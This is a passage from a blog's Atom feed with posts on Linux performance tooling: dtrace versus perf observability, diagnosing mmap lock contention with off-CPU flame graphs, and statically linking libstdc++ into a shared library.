&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; dtrace -n &lt;span class="s1"&gt;&amp;#39;syscall::read:entry { @[fds[arg0].fi_pathname] = sum(arg2); }&amp;#39;&lt;/span&gt; -p &lt;span class="nv"&gt;$PID&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Linux: &lt;code&gt;strace&lt;/code&gt; used to be a traditional solution, although it has high overhead. With &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; perf trace -eread -p &lt;span class="nv"&gt;$PID&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can now save the data and post process (although I must repeat the message about the overhead of not having in kernel aggregates).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;The problem with stack traces.&lt;/h3&gt;
&lt;p&gt;Almost all of the questions I have are of the form: "Why is my application X", and are answered by looking at userspace stack traces. Unfortunately, this is almost impossible to do in my Linux distribution. Ubuntu compiles &lt;code&gt;libc&lt;/code&gt; with &lt;code&gt;-fomit-frame-pointer&lt;/code&gt; (the &lt;code&gt;gcc&lt;/code&gt; default for &lt;code&gt;-O2&lt;/code&gt; and above), which stymies &lt;code&gt;perf&lt;/code&gt;s ability to walk stacks that go through the most commonly used system library. Worse, it is &lt;a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1248289"&gt;not clear&lt;/a&gt; that the &lt;code&gt;perf&lt;/code&gt; on Ubuntu properly supports walking &lt;code&gt;dwarf&lt;/code&gt; unwind information. I've used &lt;code&gt;--call-graph=dwarf&lt;/code&gt; only moderately successfully, as it appears to lose frames compared to the stacks in &lt;code&gt;gdb&lt;/code&gt;, etc.&lt;/p&gt;
&lt;p&gt;When Linux applications omit frame pointers, they are eschewing future visibility for the sake of an immediate micro-optimization. Some applications choose a compromise of merely omitting frame pointers for leaf functions (causing the &lt;em&gt;second to last&lt;/em&gt; frame of every stack to be omitted). In either, aggressive function inlining causes the resulting stack trace to be an approximation of the logical stack trace. As a stark contrast, the Illumos kernel forces frame pointers and prohibits small functions from being &lt;a href="https://github.com/illumos/illumos-gate/blob/6249f9725f411468c70516176806c553ac983270/usr/src/uts/Makefile.uts#L237"&gt;automatically inlined&lt;/a&gt; to guarantee precise stack traces. Since the most convenient place to add dynamic tracepoints via &lt;code&gt;dtrace&lt;/code&gt; is at function call boundaries, this also ensures that there will be a plethora of options if it ever become necessary to debug some new component.&lt;/p&gt;
&lt;h2&gt;Introspection in Linux&lt;/h2&gt;
&lt;p&gt;It seems to me that the Linux community does not support the same level of kernel/system introspection as Solaris and I think this issue is cultural, not technical. Take a look at a famous quote&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt; from &lt;a href="https://lwn.net/2000/0914/a/lt-debugger.php3"&gt;Linus himself&lt;/a&gt; in 2000 on why he eschews the use of a kernel debugger:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I don't think kernel development should be "easy". ... I do not think that extra visibility into the system is necessarily a good thing.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In Linux, the kernel is a complicated, mysterious system that is only intended to be fully understood by the authors, so tools like kernel debuggers are not necessary. &lt;/p&gt;
&lt;p&gt;Compare to a recent quote from an equally opinionated former Solaris kernel engineer, &lt;a href="https://www.youtube.com/watch?v=sYQ8j02wbCY"&gt;Bryan Cantrill&lt;/a&gt;, on why it is important to have observability into Docker containers:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Don't just reboot your pc, goddammnit, debug it! Come on, you're an educated person, right? Or at least you want to act like one around other educated people!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;In that talk, Bryan emphatically calls for bigger observability into a Linux subsystem so that complicated problems in production can be diagnosed and fixed. He condemns the engineering anti-pattern of only adding observability when something has gone wrong, pointing out that this puts the engineer in the position of trying to reproduce a potentially transient issue. Flexible dynamic tracing tools with the power to deeply introspect the kernel, like &lt;code&gt;dtrace&lt;/code&gt;, are necessary to observe and debug such issues in production.&lt;/p&gt;
&lt;h2&gt;A question driven methodology&lt;/h2&gt;
&lt;p&gt;The thing about &lt;code&gt;dtrace&lt;/code&gt; is that it is so powerful and so flexible that it encourages a &lt;em&gt;question&lt;/em&gt; driven methodology rather than &lt;em&gt;tool&lt;/em&gt; driven methodology. Rather than merely trying to infer problems from some &lt;code&gt;sar&lt;/code&gt; utility, we ask simple and specific questions to root cause an issue. The common tools (&lt;code&gt;iostat&lt;/code&gt;, &lt;code&gt;top&lt;/code&gt;, &lt;code&gt;sar&lt;/code&gt;, etc.) are useful as a means to prompt these questions but are rarely useful on their own. When Brendan Gregg advocates for the &lt;a href="http://www.brendangregg.com/usemethod.html"&gt;USE method&lt;/a&gt; or the &lt;a href="http://www.brendangregg.com/tsamethod.html"&gt;TSA method&lt;/a&gt;, he is providing frameworks for converting these &lt;code&gt;sar&lt;/code&gt; metrics into useful questions.&lt;/p&gt;
&lt;p&gt;I have a story that illustrates this point quite well. A couple of years ago, I did a mock technical interview with Adam Leventhal where he walked me through a real performance investigation he had previously done. For the interview, he described a faulty server to me and asked me to debug it using only a "magical oracle" that could answer any question about the system -- over the course of the interview, he explained how he had used &lt;code&gt;dtrace&lt;/code&gt; to answer every question we had put to the "oracle". By looking beyound the simple &lt;code&gt;sar&lt;/code&gt; metrics and asking focused questions, we were able to "resolve" in an hour an issue that would be nigh impossible to understand otherwise.&lt;/p&gt;
&lt;p&gt;Linux supports some dynamic tracing tools that enable these types of investigations, but (at least until recently) they remain second class citizens. &lt;code&gt;perf&lt;/code&gt; and &lt;code&gt;ftrace&lt;/code&gt; feel  brittle and limited compared to the deep visibility of &lt;code&gt;dtrace&lt;/code&gt;. In contrast, dynamic tracing is so valuable to Solaris that the kernel is built specifically with &lt;code&gt;dtrace&lt;/code&gt; in mind. High fidelity dynamic tracing of production is too important to be approximated by separate tools; it is baked into every layer of the system.&lt;/p&gt;
&lt;h2&gt;What can we do about this?&lt;/h2&gt;
&lt;p&gt;The question driven methodology that I've learned from my mentors from the Solaris community has proven challenging for me as I start working more within my Linux-based company. I'm slowly learning to use &lt;code&gt;perf&lt;/code&gt; to answer my questions and I'm slowly changing the culture at my current company. Some highlights:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We compile with &lt;code&gt;-fno-omit-frame-pointer&lt;/code&gt;, which increases the fidelity of our CPU stacks collected from &lt;code&gt;perf&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;We're slowly cutting back on the amount of unnecessary function inlining and have simple tools in place to detect eggregious examples of this.&lt;/li&gt;
&lt;li&gt;We have hooks to increase debuggability (via recording JIT-ed symbols for &lt;code&gt;perf&lt;/code&gt;, etc) that can be dynamically enabled at run time for ad-hoc investigations. Previously, they required a server restart.&lt;/li&gt;
&lt;li&gt;Almost all engineers at the company use flame graphs to do performance investigations. They quickly answer the first question of "where is my cpu time being spent" and it has become uncommon to see a performance regression bug filed without an attached flame graph.&lt;/li&gt;
&lt;li&gt;The most recent iteration of performance tests were &lt;a href="http://www.brendangregg.com/activebenchmarking.html"&gt;actively benchmarked&lt;/a&gt; with flame graphs as they were written. Through this process, we caught and corrected several tests that were testing the wrong path.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;I acknowledge that these questions are particularly painful to answer with &lt;code&gt;perf&lt;/code&gt;, but I am not nearly as frustrated at the awkwardness of doing so with &lt;code&gt;perf&lt;/code&gt; than I am scared of the instability in &lt;code&gt;perf&lt;/code&gt; when answering them. I want my system introspection tool to feel rock solid and I don't quite have that confidence with &lt;code&gt;perf&lt;/code&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;I acknowledge both quotes are taken &lt;em&gt;only slightly&lt;/em&gt; out of context to get the most exciting blurb, but I believe I honestly captured the sentiment of their authors in my analysis.&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="Linux"></category><category term="perf_events"></category></entry><entry><title>Using off-cpu flame graphs on Linux</title><link href="https://codearcana.com/posts/2015/12/20/using-off-cpu-flame-graphs-on-linux.html" rel="alternate"></link><published>2015-12-20T00:00:00-08:00</published><updated>2015-12-20T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2015-12-20:/posts/2015/12/20/using-off-cpu-flame-graphs-on-linux.html</id><summary type="html">&lt;p&gt;I use off-cpu flame graphs to identify that repeated mmap calls are slowing my database.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;The setup&lt;/h2&gt;
&lt;p&gt;I recently got to debug a pretty strange performance issue in a test build
of our product. It was running under a synthetic workload where we had 16
threads (one for each CPU core) each running a very simple query
(&lt;code&gt;select count(*) from t where i &amp;gt; 5&lt;/code&gt;) that would have to visit almost all of
the table's 1 million rows. In theory, this would be a CPU bound operation
since it would be reading from a file that was already in disk buffer cache.
In practice, our cores were spending about 50% of their time idle:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Each core is spending about half it's time idle." src="https://codearcana.com/images/low_cpu_usage.png" title="Each core is spending about half it's time idle."&gt;&lt;/p&gt;
&lt;h2&gt;What were our threads doing?&lt;/h2&gt;
&lt;p&gt;After confirming that our workload was indeed using 16 threads, etc, I took a
look what state our various threads were in. In every refresh of my
&lt;a href="http://hisham.hm/htop/"&gt;&lt;code&gt;htop&lt;/code&gt;&lt;/a&gt; window, I saw that a handful of our threads
were in the
&lt;a href="http://blog.kevac.org/2013/02/uninterruptible-sleep-d-state.html"&gt;&lt;code&gt;D&lt;/code&gt;&lt;/a&gt;
state corresponding to "Uninterruptible sleep":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;  PID USER      PRI  NI  VIRT   RES   SHR S CPU% MEM%   TIME+  Command&lt;/span&gt;
&lt;span class="go"&gt;55308 neil       21   1 11.6G 3825M 36804 S 530.  3.4 21h44:11 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;55969 neil       20   0 11.5G 3825M 36804 R 35.8  3.4 30:31.52 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56121 neil       20   0 11.6G 3825M 36804 D 35.8  3.4 34:55.03 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56120 neil       20   0 11.6G 3825M 36804 D 34.4  3.4 36:27.53 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56109 neil       20   0 11.6G 3825M 36804 R 33.7  3.4 31:57.14 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56088 neil       20   0 11.6G 3825M 36804 D 33.7  3.4 50:08.92 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56099 neil       20   0 11.6G 3825M 36804 D 33.7  3.4 31:58.06 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56069 neil       20   0 11.6G 3825M 36804 R 33.1  3.4 31:01.54 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56101 neil       20   0 11.6G 3825M 36804 D 32.4  3.4 28:41.27 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;56104 neil       20   0 11.6G 3825M 36804 D 32.4  3.4 31:54.41 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;55976 neil       20   0 11.5G 3825M 36804 D 32.4  3.4 30:18.72 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;55518 neil       20   0 11.5G 3825M 36804 D 32.4  3.4 29:48.51 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;55966 neil       20   0 11.5G 3825M 36804 D 32.4  3.4 36:51.50 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;55971 neil       20   0 11.5G 3825M 36804 R 32.4  3.4 27:22.96 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;55959 neil       20   0 11.5G 3825M 36804 D 32.4  3.4 38:13.50 ./memsqld&lt;/span&gt;
&lt;span class="go"&gt;55975 neil       20   0 11.5G 3825M 36804 R 31.7  3.4 30:18.38 ./memsqld&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Why were we going off CPU?&lt;/h2&gt;
&lt;p&gt;At this point, I generated an
&lt;a href="http://www.brendangregg.com/blog/2015-02-26/linux-perf-off-cpu-flame-graph.html"&gt;off-cpu flamegraph&lt;/a&gt;
using Linux &lt;code&gt;perf_events&lt;/code&gt;, to see why were entering this state. The machine I
was testing on was old enough that it didn't have &lt;code&gt;perf inject&lt;/code&gt;, so I had to
use an
&lt;a href="https://github.com/awreece/FlameGraph/blob/6f3e75f10923d1f97e4b2b0a40d8ec3c9d063974/stackcollapse-perf-sched.awk"&gt;&lt;code&gt;awk&lt;/code&gt; script&lt;/a&gt;
I'd previously written:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sudo perf record --call-graph&lt;span class="o"&gt;=&lt;/span&gt;fp -e &lt;span class="s1"&gt;&amp;#39;sched:sched_switch&amp;#39;&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;sched:sched_stat_sleep&amp;#39;&lt;/span&gt; -e &lt;span class="s1"&gt;&amp;#39;sched:sched_stat_blocked&amp;#39;&lt;/span&gt; --pid &lt;span class="k"&gt;$(&lt;/span&gt;pgrep memsqld &lt;span class="p"&gt;|&lt;/span&gt; head -n 1&lt;span class="k"&gt;)&lt;/span&gt; -- sleep 1
&lt;span class="go"&gt;[ perf record: Woken up 1 times to write data ]&lt;/span&gt;
&lt;span class="go"&gt;[ perf record: Captured and wrote 1.343 MB perf.data (~58684 samples) ]&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; sudo perf script -f time,comm,pid,tid,event,ip,sym,dso,trace -i sched.data &lt;span class="p"&gt;|&lt;/span&gt; ~/FlameGraph/stackcollapse-perf-sched.awk &lt;span class="p"&gt;|&lt;/span&gt; ~/FlameGraph/flamegraph.pl --color&lt;span class="o"&gt;=&lt;/span&gt;io --countname&lt;span class="o"&gt;=&lt;/span&gt;us &amp;gt;off-cpu.svg
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;em&gt;Note: recording scheduler events via &lt;code&gt;perf record&lt;/code&gt; can have a very large overhead and should be used cautiously in production environments. This is why I wrap the &lt;code&gt;perf record&lt;/code&gt; around a &lt;code&gt;sleep 1&lt;/code&gt; to limit the duration.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;object data="https://codearcana.com/images/mmap_off_cpu.svg" style="width:100%;"&gt;&lt;/object&gt;&lt;/p&gt;
&lt;p&gt;From the repeated calls to &lt;code&gt;rwsem_down_read_failed&lt;/code&gt; and &lt;code&gt;rwsem_down_write_failed&lt;/code&gt;, we see that culprit was &lt;code&gt;mmap&lt;/code&gt;contending in the kernel on the &lt;code&gt;mm-&amp;gt;mmap_sem&lt;/code&gt; lock:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;down_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;mm&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;mmap_sem&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;do_mmap_pgoff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;addr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prot&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pgoff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                    &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;populate&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="n"&gt;up_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;mm&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;mmap_sem&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This was causing every &lt;code&gt;mmap&lt;/code&gt; syscall to take 10-20ms (almost half the latency of the query itself):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sudo perf trace -emmap --pid &lt;span class="k"&gt;$(&lt;/span&gt;pgrep memsqld &lt;span class="p"&gt;|&lt;/span&gt; head -n 1&lt;span class="k"&gt;)&lt;/span&gt; -- sleep 5
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;span class="go"&gt;12453.692 ( 9.060 ms): memsqld/55950 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 65&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95ece9f000&lt;/span&gt;
&lt;span class="go"&gt;12453.777 ( 8.924 ms): memsqld/55956 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 67&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95ecbf5000&lt;/span&gt;
&lt;span class="go"&gt;12456.748 (15.170 ms): memsqld/56112 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 77&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95ec48d000&lt;/span&gt;
&lt;span class="go"&gt;12461.476 (19.846 ms): memsqld/56091 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 79&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95ec1e3000&lt;/span&gt;
&lt;span class="go"&gt;12461.664 (12.226 ms): memsqld/55514 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 84&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95ebe84000&lt;/span&gt;
&lt;span class="go"&gt;12461.722 (12.240 ms): memsqld/56100 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 85&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95ebd2f000&lt;/span&gt;
&lt;span class="go"&gt;12461.761 (20.127 ms): memsqld/55522 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 82&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95ebfb9000&lt;/span&gt;
&lt;span class="go"&gt;12463.473 (17.544 ms): memsqld/56113 mmap(len: 1265444, prot: READ, flags: PRIVATE|POPULATE, fd: 75&amp;lt;/mnt/rob/memsqlbin/data/columns/bi/4/634/12883&amp;gt;) = 0x7f95eb990000&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Fortunately, the fix was simple -- we switched from using &lt;code&gt;mmap&lt;/code&gt; to using
the traditional file &lt;code&gt;read&lt;/code&gt; interface. After this change, we nearly doubled
our throughput and became CPU bound as we expected:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Almost 100% CPU utilization" src="https://codearcana.com/images/high_cpu_usage.png" title="Almost 100% CPU utilization"&gt;&lt;/p&gt;
&lt;h2&gt;Open questions&lt;/h2&gt;
&lt;p&gt;I'll buy a {root,}beer/beverage of choice for anyone who can help me with these
questions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Is there a good tool in Linux to see (in periodic updates) what % of time a thread spends in each of the various possible thread states?&lt;/li&gt;
&lt;li&gt;Why do the time spent sleeping / executing mmap as recorded by by the sched probes not align with the latency of mmap calls if the mmap calls don't show in cpu stack traces? (I suspect that &lt;code&gt;mm_populate&lt;/code&gt; or &lt;code&gt;rwsem_down_read_failed&lt;/code&gt; does an alarming amount of work while having disabled bottom half interrupts, which is interfering with &lt;code&gt;perf&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;</content><category term="Linux"></category><category term="perf_events"></category><category term="flamegraph"></category></entry><entry><title>Statically linking libstdc++</title><link href="https://codearcana.com/posts/2015/12/09/statically-linking-libstdc.html" rel="alternate"></link><published>2015-12-09T00:00:00-08:00</published><updated>2015-12-09T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2015-12-09:/posts/2015/12/09/statically-linking-libstdc.html</id><summary type="html">&lt;p&gt;In this post, I statically link &lt;code&gt;libstdc++&lt;/code&gt; into a &lt;code&gt;configure&lt;/code&gt;d library.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I recently found myself wanting to statically link &lt;code&gt;libstdc++&lt;/code&gt; into a 
library I was compiling and found it to be a surprising challenging process.&lt;/p&gt;
&lt;h2&gt;Small example library&lt;/h2&gt;
&lt;p&gt;I first started playing with a small example library:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="n"&gt;__attribute__&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;noinline&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="n"&gt;bar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;__FILE__&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;  &lt;span class="s"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;__func__&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="n"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;bar&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
  &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Before I even got to statically compiling &lt;code&gt;libstdc++&lt;/code&gt;, I noticed something
strange: The symbol &lt;code&gt;bar&lt;/code&gt; was getting resolved through the PLT!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gcc -O3 -shared -fPIC foo.cpp -o foo.so
&lt;span class="gp"&gt;$&lt;/span&gt; gdb foo.so --batch --ex &lt;span class="s2"&gt;&amp;quot;disas foo&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Dump of assembler code for function _Z3foov:&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b70 &amp;lt;+0&amp;gt;: push   %rbp&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b71 &amp;lt;+1&amp;gt;: push   %rbx&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b72 &amp;lt;+2&amp;gt;: sub    $0x8,%rsp&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b76 &amp;lt;+6&amp;gt;: callq  0x960 &amp;lt;_Z3barv@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I played around with a couple of things, and eventualy figured out I could
mark &lt;code&gt;bar&lt;/code&gt; as having hidden visibility and then it wouldn't use this PLT.&lt;/p&gt;
&lt;h2&gt;Static &lt;code&gt;libstdc++&lt;/code&gt;?&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;g++&lt;/code&gt; has a command line option &lt;code&gt;-static-libstdc++&lt;/code&gt; which appears to do
exactly what I want. Unfortunately, the calls to the &lt;code&gt;libstdc++&lt;/code&gt; symbols 
are resolved via the PLT, as above with &lt;code&gt;bar&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gcc -static-libstdc++ -O3 -shared -fPIC foo.cpp -o foo.so
&lt;span class="gp"&gt;$&lt;/span&gt; /tmp% gdb foo.so --batch --ex &lt;span class="s2"&gt;&amp;quot;disas foo&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b21 &amp;lt;+1&amp;gt;: push   %rbx&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b22 &amp;lt;+2&amp;gt;: sub    $0x8,%rsp&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b26 &amp;lt;+6&amp;gt;: callq  0xa80 &amp;lt;_Z3barv&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b2b &amp;lt;+11&amp;gt;:  mov    0x20049e(%rip),%rbx        # 0x200fd0&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b32 &amp;lt;+18&amp;gt;:  lea    0x7a(%rip),%rsi        # 0xbb3&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b39 &amp;lt;+25&amp;gt;:  mov    $0x5,%edx&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b3e &amp;lt;+30&amp;gt;:  mov    %rbx,%rdi&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000000b41 &amp;lt;+33&amp;gt;:  callq  0x930 &amp;lt;_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;... &amp;lt;snip&amp;gt; ...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;I tried to do a cute trick to make all the C++ functions have hidden
visibility:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#pragma GCC visibility push(hidden)&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#pragme GCC visibility pop&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Unfortunately, the symbols were &lt;em&gt;still&lt;/em&gt; resolved via the PLT. What was going on?
Could I force &lt;code&gt;g++&lt;/code&gt; to just use the symbols in the binary it had a copy of rather
than using the PLT?&lt;/p&gt;
&lt;h2&gt;&lt;code&gt;Bsymbolic-functions&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;Some deep soul searching lead me to
&lt;a href="http://stackoverflow.com/q/7216973"&gt;a stack overflow post&lt;/a&gt; where someone else
had the same questions and talked about a flag that solved this exact problem.
This allowed me to get rid of the visiblity annotation on &lt;code&gt;bar&lt;/code&gt;, but it still didn't
solve my libstdc++ problem.&lt;/p&gt;
